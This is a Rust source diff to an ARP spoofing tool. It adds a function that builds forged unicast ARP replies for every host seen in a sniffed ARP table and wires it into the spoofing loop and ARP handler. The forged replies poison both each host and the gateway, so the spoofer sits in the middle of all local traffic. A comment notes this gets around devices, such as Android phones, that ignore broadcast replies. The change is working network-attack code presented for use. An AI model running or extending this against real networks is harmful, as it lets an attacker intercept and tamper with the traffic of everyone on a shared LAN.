@@ -200,6 +200,52 @@ fn make_poison_frames(spoofer: Host, gateway: Host, target: Option<Host>) -> Vec
     poisons
 }
 
+/// Unicast poison frames for every host discovered via sniffed ARP traffic.
+/// Many devices (i.e., Android) ignore unsolicited broadcast ARP replies,
+/// but accept unicast ones.
+fn make_unicast_poison_frames(
+    table: &HashMap<Ipv4Addr, MacAddr>,
+    spoofer: Host,
+    gateway: Host,
+) -> Vec<Bytes> {
+    let mut poisons: Vec<Bytes> = Vec::new();
+
+    for (host_ip, host_mac) in table.iter() {
+        if *host_ip == gateway.ip {
+            continue;
+        }
+
+        let to_host = DataLinkFrame {
+            eth_dst: *host_mac,
+            eth_src: spoofer.mac,
+            payload: ArpPacket {
+                opcode: ArpOpCode::Reply,
+                sender_mac: spoofer.mac,
+                sender_ip: gateway.ip,
+                target_mac: *host_mac,
+                target_ip: *host_ip,
+            },
+        };
+
+        let to_gateway = DataLinkFrame {
+            eth_dst: gateway.mac,
+            eth_src: spoofer.mac,
+            payload: ArpPacket {
+                opcode: ArpOpCode::Reply,
+                sender_mac: spoofer.mac,
+                sender_ip: *host_ip,
+                target_mac: gateway.mac,
+                target_ip: gateway.ip,
+            },
+        };
+
+        poisons.push(to_host.encode());
+        poisons.push(to_gateway.encode());
+    }
+
+    poisons
+}
+
 async fn send_poisons(
     tx: &DataLinkSender,
     poisons: &[Bytes],
@@ -242,6 +288,12 @@ async fn spoof_loop(
         tokio::select! {
             _ = tick.tick() => {
                 send_poisons(tx, &poisons, dump).await?;
+
+                // In broadcast mode, unicast poison also every host seen in the ARP table
+                if target.is_none() {
+                    let unicast_poisons: Vec<Bytes> = make_unicast_poison_frames(table, spoofer, gateway);
+                    send_poisons(tx, &unicast_poisons, dump).await?;
+                }
             },
             frame = rx.next() => {
                 if let Err(e) = handle_frame(frame?, table, spoofer, gateway, target, tx, &poisons, dump).await {
@@ -298,6 +350,12 @@ async fn handle_arp(
         dump_frame(dump, frame).await;
 
         send_poisons(tx, poisons, dump).await?;
+
+        // In broadcast mode, unicast poison also every host seen in the ARP table
+        if target.is_none() {
+            let unicast_poisons: Vec<Bytes> = make_unicast_poison_frames(table, spoofer, gateway);
+            send_poisons(tx, &unicast_poisons, dump).await?;
+        }
 
         return Ok(());
     }
